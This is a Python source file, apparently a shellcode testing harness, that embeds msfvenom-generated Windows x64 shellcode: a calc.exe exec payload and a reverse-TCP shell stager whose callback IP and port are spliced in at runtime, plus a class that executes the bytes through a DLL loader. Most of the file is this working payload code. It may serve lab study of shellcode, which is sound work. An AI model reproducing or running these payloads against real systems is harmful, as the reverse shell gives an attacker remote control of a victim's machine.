

import os
import struct

from c_workspace.DLLIntegration import DLLIntegration

PLATFORMS = {
    'windows': "windows",
    'ubuntu': 'ubuntu'
}

class Win64ShellCode():

    @staticmethod
    def cmd_calc():
        # shellcode which generate by: 'msfvenom --payload windows/x64/exec CMD='cacl.exe' -f py'
        cmd_calc =  b""
        cmd_calc += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
        cmd_calc += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
        cmd_calc += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
        cmd_calc += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
        cmd_calc += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        cmd_calc += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
        cmd_calc += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        cmd_calc += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
        cmd_calc += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
        cmd_calc += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        cmd_calc += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
        cmd_calc += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
        cmd_calc += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        cmd_calc += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        cmd_calc += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        cmd_calc += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        cmd_calc += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
        cmd_calc += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
        cmd_calc += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
        cmd_calc += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
        cmd_calc += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        cmd_calc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
        cmd_calc += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
        return cmd_calc

    @staticmethod
    def reverse_tcp(ip:str, port:int):
        #----------------check input ip and port format----------------
        #----------------show input converting----------------
        hex_ip:bytes = bytes(map(int, ip.split('.')))
        hex_port:bytes = struct.pack(">H", port)    # Big-endian        
        # print("hex_ip = ", "".join(f"\\x{b:02x}" for b in hex_ip), "hex_port = ", "".join(f"\\x{b:02x}" for b in hex_port))

        #----------------show correct format----------------
        # hex_ip = b"\x7f\x00\x00\x01"
        # hex_port = b"\x7a\x69"
        # print("hex_ip = ", "".join(f"\\x{b:02x}" for b in hex_ip), "hex_port = ", "".join(f"\\x{b:02x}" for b in hex_port))

        #  msfvenom --payload windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=31337 --format py    reversed_tcp =  b""
        reversed_tcp =  b""
        reversed_tcp += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
        reversed_tcp += b"\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52"
        reversed_tcp += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9"
        reversed_tcp += b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0"
        reversed_tcp += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        reversed_tcp += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
        reversed_tcp += b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
        reversed_tcp += b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
        reversed_tcp += b"\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49"
        reversed_tcp += b"\x01\xd0\x8b\x48\x18\x50\xe3\x56\x4d\x31\xc9\x48"
        reversed_tcp += b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0"
        reversed_tcp += b"\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1"
        reversed_tcp += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
        reversed_tcp += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        reversed_tcp += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
        reversed_tcp += b"\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59"
        reversed_tcp += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        reversed_tcp += b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49"
        reversed_tcp += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
        reversed_tcp += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
        reversed_tcp += b"\x49\xbc\x02\x00"

        # reversed_tcp += b"\x7a\x69"             # 31337 = \x7a\x69 
        # reversed_tcp += b"\x7f\x00\x00\x01"     # 127.0.0.1 = \x7f\x00\x00\x01
        reversed_tcp += hex_port
        reversed_tcp += hex_ip

        reversed_tcp += b"\x41\x54" 
        reversed_tcp += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        reversed_tcp += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
        reversed_tcp += b"\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50"
        reversed_tcp += b"\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
        reversed_tcp += b"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf"
        reversed_tcp += b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        reversed_tcp += b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
        reversed_tcp += b"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00"
        reversed_tcp += b"\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
        reversed_tcp += b"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8"
        reversed_tcp += b"\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20"
        reversed_tcp += b"\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00"
        reversed_tcp += b"\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4"
        reversed_tcp += b"\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
        reversed_tcp += b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba"
        reversed_tcp += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
        reversed_tcp += b"\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00"
        reversed_tcp += b"\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41"
        reversed_tcp += b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
        reversed_tcp += b"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6"
        reversed_tcp += b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
        reversed_tcp += b"\xf0\xb5\xa2\x56\xff\xd5"

        return reversed_tcp


class ShellCodeTesting():
    dll_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c_workspace\libs\main.dll")

    @staticmethod
    def run(platform:str, shellcode:bytes):
        if platform not in PLATFORMS.keys():
            raise Exception("Invalid platform")
        
        if platform == PLATFORMS['windows']:
            print(ShellCodeTesting.dll_path)
            mylibs = DLLIntegration(ShellCodeTesting.dll_path)
            mylibs.testOp(shellcode)

# Instructions
# (+) get shellcode from class Win64ShellCode
#   - Win64ShellCode.cmd_calc()
#   - Win64ShellCode.reverse_tcp("127.0.0.1", 31337)
# (+) (test) run shellcode with platform
#   - ShellCodeTesting.run(PLATFORMS['windows'], Win64ShellCode.cmd_calc)
#   - ShellCodeTesting.run(PLATFORMS['windows'], Win64ShellCode.reverse_tcp("127.0.0.1", 31337))
